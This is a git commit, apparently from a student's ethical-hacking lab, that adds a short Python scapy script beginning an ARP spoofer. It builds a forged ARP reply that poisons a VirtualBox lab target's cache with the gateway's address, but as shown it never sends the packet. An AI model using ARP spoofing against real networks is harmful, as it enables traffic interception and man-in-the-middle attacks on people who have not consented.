f82a4f9426f7b621e17d06c4b9a11c4b5ecade50
jean_kali <jeanandrewfuentes@gmail.com>
2020-02-29 04:38:02 -0500

    Creating arp_spoofer.py

---
+++ arp_spoof.py
@@ -0,0 +1,9 @@
+#!/usr/bin/env python
+
+import scapy.all as scapy
+
+target_ip="10.0.2.15"
+target_mac="08:00:27:31:de:a3"
+gateway_ip = "10.0.2.1"
+
+packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip )
